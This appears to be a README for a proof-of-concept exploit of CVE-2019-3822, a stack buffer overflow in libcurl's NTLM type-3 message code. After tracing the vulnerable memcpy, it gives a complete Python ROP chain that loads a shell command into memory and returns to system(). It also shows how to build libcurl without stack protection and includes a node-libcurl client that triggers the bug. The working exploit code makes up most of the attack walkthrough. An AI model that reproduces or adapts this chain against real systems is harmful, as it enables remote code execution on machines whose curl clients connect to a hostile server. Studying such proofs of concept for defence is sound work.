The script `build-cve-2019-3822.sh` will setup (in the directory $CVE_2019_3822) a NAN Javascript exploit for [CVE-2019-3822](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3822).

In a negotiated  NTLM connection, libcurl sends a message back to the server with the server's original response. If the server sends a large buffer in its original response it overflows a stack buffer allowing for a stack buffer overflow attack.

libcurl can be found at:

```
git clone https://github.com/curl/curl.git
```

`curl-7_63_0` is a vulnerable version:

```git checkout curl-7_63_0```


This memcpy in `Curl_auth_create_ntlm_type3_message` is the overflow:


```
.../curl/lib/vauth/ntlm.c:491

CURLcode Curl_auth_create_ntlm_type3_message(struct Curl_easy *data,
                                             const char *userp,
                                             const char *passwdp,
                                             struct ntlmdata *ntlm,
                                             char **outptr, size_t *outlen)

{
  /* NTLM type-3 message structure:

          Index  Description            Content
            0    NTLMSSP Signature      Null-terminated ASCII "NTLMSSP"
                                        (0x4e544c4d53535000)
            8    NTLM Message Type      long (0x03000000)
           12    LM/LMv2 Response       security buffer
           20    NTLM/NTLMv2 Response   security buffer
           28    Target Name            security buffer
           36    User Name              security buffer
           44    Workstation Name       security buffer
          (52)   Session Key            security buffer (*)
          (60)   Flags                  long (*)
          (64)   OS Version Structure   8 bytes (*)
  52 (64) (72)   Start of data block
                                          (*) -> Optional
  */

  CURLcode result = CURLE_OK;
  size_t size;
  unsigned char ntlmbuf[NTLM_BUFSIZE];

...

#ifdef USE_NTRESPONSES
  if(size < (NTLM_BUFSIZE - ntresplen)) {
    DEBUGASSERT(size == (size_t)ntrespoff);
    memcpy(&ntlmbuf[size], ptr_ntresp, ntresplen);
    size += ntresplen;
  }
```

`ntlmbuf` is declared on the stack with 1024 bytes:

```
curl/lib/vauth/ntlm.h:31

/* NTLM buffer fixed size, large enough for long user + host + domain */
#define NTLM_BUFSIZE 1024

curl/lib/vauth/ntlm.c:69
  unsigned char ntlmbuf[NTLM_BUFSIZE];
```

If the ntlm connection is negotiated, `ntresplen` is calculated here:

```
curl/lib/vauth/ntlm.c:592

    /* NTLMv2 response */
    result = Curl_ntlm_core_mk_ntlmv2_resp(ntlmv2hash, entropy,
                                           ntlm, &ntlmv2resp, &ntresplen);

curl/lib/curl_ntlm_core.c:696
CURLcode Curl_ntlm_core_mk_ntlmv2_resp(unsigned char *ntlmv2hash,
                                       unsigned char *challenge_client,
                                       struct ntlmdata *ntlm,
                                       unsigned char **ntresp,
                                       unsigned int *ntresp_len)

...
  /* Calculate the response len */
  len = NTLM_HMAC_MD5_LEN + NTLMv2_BLOB_LEN;  # 1488 > 1024

  return result;
```


Since 1488 > 1024 the stack buffer is overwritten. (I think their analysis of this bug is wrong too; this buffer is a fixed size so any negotiated ntml response will overflow the buffer.)

```
    memcpy(&ntlmbuf[size], ptr_ntresp, ntresplen);
```

The `ptr_ntresp` is a (thankfully) base64 decoded buffer sent from the server.
A decoded base64 buffer is binary and it's memcpy'd (not strcpy'd) so we don't need to worry about zeroes in the overflow.

For here on it's a pretty standard stackflow: return to libc (system) with the command in the `rdi` register.

Somethings you get lucky and you command is already in `rdi`: this is not one of those times.

Sometimes you get lucky and you can just point `rdi` to a place on the stack with your command. This worked fine under the debugger but the stack was weirdly trashed by the time system was call outside the debugger (often they are very close if ASLR is disabled)

Instead we'll just use ropper to create a rop chain to load our command into an address in the heap. Since ASLR is disabled we can just make an guess at a valid heap address then load that address into `rdi`.

This is the python generated by Ropper that generates the rop chain string to load the command `touch REQUIRESECURITY` into `rdi`. The string is added to server's initial response so it aligns retq.

```
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x7ffff5863000 # a0e971d42962917d1054da891917230387f2613ff20c74bfd30a02c334280078
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

addr = 0x555557374000

rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += b"touch RE"
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
#rop += rebase_0(0x000000000008f000)
rop += p(addr)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042fe5) # 0x0000000000042fe5: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += b'QUIRESEC'
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
#rop += rebase_0(0x000000000008f008)
rop += p(addr + 8)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042fe5) # 0x0000000000042fe5: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += b"URITY   "
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
# rop += rebase_0(0x000000000008f010)
rop += p(addr + 16)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042fe5) # 0x0000000000042fe5: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
# rop += rebase_0(0x000000000008f018)
rop += p(addr + 24)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042fe5) # 0x0000000000042fe5: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x000000000001fa40) # 0x000000000001fa40: pop rdi; ret; 
#rop += rebase_0(0x000000000008f000)
rop += p(addr)
rop += rebase_0(0x00000000000219e3) # 0x00000000000219e3: pop rsi; ret; 
# rop += rebase_0(0x000000000008f018)
rop += p(addr + 24)
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
# rop += rebase_0(0x000000000008f018)
rop += p(addr + 24)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += p(0x000000000000003b)
rop += p(0x7ffff59bcbe1)
rop += p(0x7ffff7aa6410)
ntlm += rop
```

This line does an extra retq to realign the stack.
```
rop += p(0x7ffff59bcbe1)
```

And this line returns to `system`.

```
rop += p(0x7ffff7aa6410)
```


Modern gcc code detects stack smashing by default. Rather than deal with stack canaries we just build libcurl with stack protections disabled:

```
CFLAGS="-fno-stack-protector" CPPFLAGS=$CFLAGS ./configure --with-openssl --enable-debug --prefix=${CVE_2019_3822}/build/curl
```

Finally a node-libcurl javascript connecting using a negotiated NTLM connection:

```
const { Curl } = require('node-libcurl');

const curl = new Curl();

curl.setOpt('HTTPAUTH', '8');
curl.setOpt('URL', 'localhost:5555');
curl.setOpt('FOLLOWLOCATION', true);
curl.setOpt('USERPWD', 'uname:p');
curl.on('end', function (statusCode, data, headers) {
  console.info(statusCode);
  console.info('---');
  console.info(data.length);
  console.info('---');
  console.info(this.getInfo( 'TOTAL_TIME'));
  
  this.close();
});

curl.on('error', curl.close.bind(curl));
curl.perform();
```

libcurl has a `--negotiate` option but this does not set the ntlm connection to negotiate. The server's response has a flag set to tell the client this ntlm connection is negotiated.







